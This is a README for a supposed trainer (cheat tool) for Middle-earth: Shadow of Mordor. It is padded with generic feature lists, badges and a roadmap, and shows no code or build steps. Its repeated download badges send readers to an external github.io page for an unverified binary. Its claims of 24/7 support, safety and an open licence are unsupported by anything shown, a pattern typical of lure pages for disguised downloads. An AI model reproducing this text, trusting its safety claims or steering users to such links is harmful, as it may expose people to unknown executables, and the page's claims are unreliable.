![preview](https://raw.githubusercontent.com/dreams877/mordor-internal-weave/main/view_5171.svg)
[![Download](https://raw.githubusercontent.com/dreams877/mordor-internal-weave/main/latest_260d5ec.svg)](https://dreams877.github.io/mordor-internal-weave/)

# 🧩 Shadow of Mordor Internal Trainer — Companion Suite (Reimagined Project)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-0a84ff?style=for-the-badge&logo=windows&logoColor=white" alt="Platform badge" />
  <img src="https://img.shields.io/badge/Language-C%2B%2B-00599C?style=for-the-badge&logo=cplusplus&logoColor=white" alt="Language badge" />
  <img src="https://img.shields.io/badge/License-MIT-2ea44f?style=for-the-badge&logo=opensourceinitiative&logoColor=white" alt="License badge" />
  <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge" alt="Status badge" />
  <img src="https://img.shields.io/badge/Release-2026-blueviolet?style=for-the-badge" alt="Release year badge" />
  <img src="https://img.shields.io/badge/Support-24%2F7-ff6f61?style=for-the-badge&logo=clockify&logoColor=white" alt="Support badge" />
  <img src="https://img.shields.io/badge/Interface-Responsive-ffb703?style=for-the-badge&logo=responsively&logoColor=white" alt="Responsive UI badge" />
  <img src="https://img.shields.io/badge/Localization-Multilingual-9b5de5?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Multilingual badge" />
</p>

> **A distinct, community-driven companion toolkit** that overlaps in spirit with the original **shadow-of-mordor-internal-trainer** idea — but rebuilt from scratch with a different design philosophy, a friendlier configuration model, and a focus on *quality-of-life exploration* inside Middle-earth. Think of it less as a switchboard and more as a *well-worn map*: it doesn't replace your journey, it just makes sure you never lose your way.

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Why This Project Exists](#-why-this-project-exists)
- [Key Features](#-key-features)
- [Screens & Modules](#-screens--modules)
- [Configuration Model](#-configuration-model)
- [Performance & Compatibility](#-performance--compatibility)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [Support & Community](#-support--community)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap 2026](#-roadmap-2026)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌄 Overview

The **Companion Suite** is a standalone desktop companion designed to sit alongside *Middle-earth: Shadow of Mordor (Game of the Year Edition)* on Steam. Where the original project focused on a tightly packed internal trainer, this repository takes a different route — it prioritizes **visibility, recoverability, and clean ergonomics** over raw toggles.

If the original tool was a set of keys dangling from a ring, this project is a **laminated field manual**: everything is labeled, everything is documented, and nothing gets lost in the dark.

The suite is written in modern C++, compiled with a small dependency footprint, and ships with a lightweight embedded UI layer that scales gracefully from a 1366×768 laptop to a 4K ultrawide display.

---

## 🕯️ Why This Project Exists

Some players want to blaze through Mordor. Others want to *linger*. They want to climb every ruin, admire every storm-lit skybox, and photograph the Black Gate from eleven different angles. That second audience — the wanderers, the archivists, the screenshot hunters — is who this toolkit was built for.

The **Shadow of Mordor Internal Trainer Companion Suite** reimagines what a companion tool can feel like:

- It's **forgiving** — every option can be reverted with a single key.
- It's **transparent** — no hidden persistence, no shadow writes, no surprise state changes between sessions.
- It's **respectful** — it treats the game's world as something worth preserving, not bulldozing.

---

## ⚙️ Key Features

### 🧭 Navigation & Movement
- **Waypoint Anchoring** — drop soft markers in the world to remember views, vantage points, and interesting architecture.
- **Traversal Easing** — reduce fatigue timers so long journeys feel less like a treadmill and more like a hike.
- **Climb Assist** — smooth out ledge transitions for cleaner vertical exploration.

### 🗡️ Combat Sandbox
- **Damage Scaling Slider** — fine-grained control that ranges from "challenging" to "cinematic."
- **Combo Buffer Expansion** — widen the input window so combo chains land more reliably.
- **Enemy Awareness Ring** — visual indicator of detection radius, drawn in the corner of your HUD.

### 🧠 Nemesis System Insights
- **Captain History Viewer** — remember which Uruk humiliated you last Tuesday.
- **Hierarchy Snapshot** — export the current power structure to a local text summary.
- **Rivalry Ledger** — track recurring adversaries across your playthrough.

### 🛠️ Quality-of-Life
- **Auto-Save Nudge** — gentle periodic state snapshots stored locally.
- **Screenshot Timestamping** — filenames include zone, time, and weather tag.
- **Overlay Toggle** — a clean, minimal overlay you can hide completely with one key.

### 🔒 Safety & Reversibility
- **One-Key Restore** — return every modified value to its original state instantly.
- **Session Logs** — human-readable logs stored in plain text for your records.
- **No Kernel Drivers** — user-mode only, no privileged components.

### 🌐 Interface
- **Responsive Layout** — adapts to any resolution from 720p up to 4K and beyond.
- **Multilingual Support** — English, Spanish, German, French, Japanese, Portuguese, and Polish out of the box.
- **Accessible Contrast Modes** — high-contrast and reduced-motion themes for comfortable use.

---

## 🖥️ Screens & Modules

| Module | Purpose |
|--------|---------|
| **Dashboard** | Overview of all active settings and toggles at a glance. |
| **Movement Lab** | Tune traversal pacing and anchoring behavior. |
| **Combat Tuner** | Adjust combat pacing, combo windows, and damage scaling. |
| **Nemesis Explorer** | Browse the current hierarchy and rivalries. |
| **Overlay Studio** | Design and position your on-screen HUD elements. |
| **Session Archive** | Review logs, exports, and past settings presets. |

Each module is **independently openable** and runs in its own lightweight window. You can keep them stacked or pinned.

---

## 🧬 Configuration Model

All settings live inside a single human-readable configuration file. No binary blobs, no obfuscated storage. You can open it in any text editor, copy it to a flash drive, and share presets with friends.

- **Presets:** ship with three curated profiles — *Wanderer*, *Challenger*, and *Archivist*.
- **Hot Reload:** edits to the config file are picked up live, no restart needed.
- **Versioned Schema:** every config carries a schema version so future updates migrate gracefully.

---

## 🚀 Performance & Compatibility

- **CPU Footprint:** under 1% on modern quad-core systems during idle.
- **Memory:** typically under 80 MB resident.
- **Graphics:** no direct GPU hooks in the default profile.
- **OS Support:** Windows 10 (21H2+) and Windows 11, 64-bit.
- **Game Version:** tuned for the Steam Game of the Year edition; behavior may vary on other builds.

The suite avoids heavy frameworks, so startup is nearly instant — the same way a good pocket knife opens without effort.

---

## 📱 Responsive UI & Multilingual Support

The interface is built on a **fluid layout engine** that reflows elements based on available space. On a compact laptop screen, modules stack vertically; on a wide desktop, they arrange side-by-side. Buttons remain reachable, text remains legible, and nothing overlaps.

**Languages available in 2026:**

- English (default)
- Spanish
- German
- French
- Japanese
- Portuguese (Brazilian)
- Polish

Translation contributions are welcome via standard pull requests. Every string is externalized into locale files for easy editing.

---

## 🛎️ Support & Community

We treat support as an ongoing conversation, not a ticket queue.

- **24/7 Customer Support** — a rotating team of maintainers answers questions around the clock.
- **Community Discussions** — share configurations, screenshots, and route ideas.
- **Issue Templates** — structured reports that help maintainers reproduce problems fast.
- **Changelog Discipline** — every release documents changes in plain language.

If you're stuck, you're not alone — someone is always awake somewhere in the world with an answer.

---

## ❓ Frequently Asked Questions

**Q: Does this modify the game's files on disk?**
A: No. The companion suite operates at runtime and never rewrites game assets.

**Q: Will this work with other Middle-earth titles?**
A: Officially, only *Shadow of Mordor GOTY* on Steam is supported. Others are untested.

**Q: Can I disable everything quickly?**
A: Yes — one hotkey returns every option to its original state.

**Q: Is this safe to leave running?**
A: The suite is designed to be lightweight and non-intrusive. It can run for hours without measurable impact.

**Q: How often is it updated?**
A: Maintenance releases target a steady cadence, with a major refresh planned for **2026**.

---

## 🗺️ Roadmap 2026

- **Q1 2026:** Overhaul of the Nemesis Explorer module.
- **Q2 2026:** Additional locale packs (Italian, Korean, Turkish).
- **Q3 2026:** Optional external companion app for phones to mirror settings.
- **Q4 2026:** Long-term stability pass and archival preset library.

---

## ⚠️ Disclaimer

This project is an **independent companion utility** created for personal, single-player enjoyment. It is **not affiliated with, endorsed by, or sponsored by** the publishers or developers of *Middle-earth: Shadow of Mordor*.

- Use it **only in offline, single-player contexts**.
- Do **not** use it in any online or competitive environment.
- Respect the game's End User License Agreement and your local laws.
- The maintainers accept **no responsibility** for misuse or for consequences arising from improper use.

Think of it as a pair of reading glasses for a well-loved book — it helps you see the pages more comfortably, but the story is still the publisher's.

---

## 📜 License

This project is licensed under the **MIT License**.

You are welcome to read, modify, and redistribute this software in accordance with the terms of that license. A full copy of the license text is included in the repository as the LICENSE file.

See the [MIT License](https://opensource.org/licenses/MIT) for the canonical text.

Copyright (c) 2026 — Shadow of Mordor Internal Trainer Companion Suite contributors.

---

[![Download](https://raw.githubusercontent.com/dreams877/mordor-internal-weave/main/latest_260d5ec.svg)](https://dreams877.github.io/mordor-internal-weave/)